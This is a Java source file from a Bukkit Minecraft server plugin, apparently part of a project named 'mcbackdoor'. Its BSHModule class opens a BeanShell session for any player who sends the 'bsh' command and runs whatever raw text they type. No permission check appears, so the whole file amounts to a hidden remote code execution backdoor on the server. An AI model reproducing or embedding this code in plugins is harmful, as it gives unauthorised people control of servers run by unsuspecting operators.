/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package org.martin.bukkit.mcbackdoor.scmd.modules;

import java.util.HashMap;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.martin.bukkit.mcbackdoor.scmd.Module;
import org.martin.bukkit.mcbackdoor.utils.BSHExecutor;

/**
 *
 * @author Kekec852
 */
public class BSHModule implements Module{
    private HashMap<Player,BSHExecutor> shells = new HashMap<Player, BSHExecutor>();
    public void enable() {
        
    }

    public void disable() {
        
    }

    public void setPlugin(JavaPlugin pl) {
        
    }

    public boolean onCommand(CommandSender sender, String[] args, String unclean) {
        if(sender instanceof Player){
            Player player = (Player) sender;
            BSHExecutor ex = shells.get(player);
            if(ex == null){
                ex = new BSHExecutor(sender);
                shells.put(player, ex);
            }
            if (args.length == 1 && args[0].equalsIgnoreCase("stop")){
                shells.remove(player);
                return true;
            }
            if (args.length == 1 && args[0].equalsIgnoreCase("start")){
                return true;
            }
            ex.sednCMD(unclean);
            return true;
        }
        return false;
    }

    public String getCMD() {
        return "bsh";
    }

    
}
